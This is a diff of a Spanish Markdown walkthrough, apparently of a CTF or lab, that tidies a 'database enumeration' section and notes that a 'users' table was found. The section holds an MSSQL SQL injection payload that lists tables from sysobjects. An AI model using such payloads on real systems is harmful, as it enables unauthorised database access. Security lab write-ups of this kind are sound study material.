@@ -91,12 +91,12 @@ después de logearnos podemos ver el apartado de management y lo primero que vem
 ### Enumeración de la base de datos
 
 ```python
-```
 '+(select name from webapp..sysobjects where xtype = 'U' order by name offset 1 rows fetch next 1 rows only)+'
-``
 ```
 
+en esta enumeración podemos ver que existe una tabla que se llama `users`
 ![[Pasted image 20240714132734.png]]
+
 
 
 
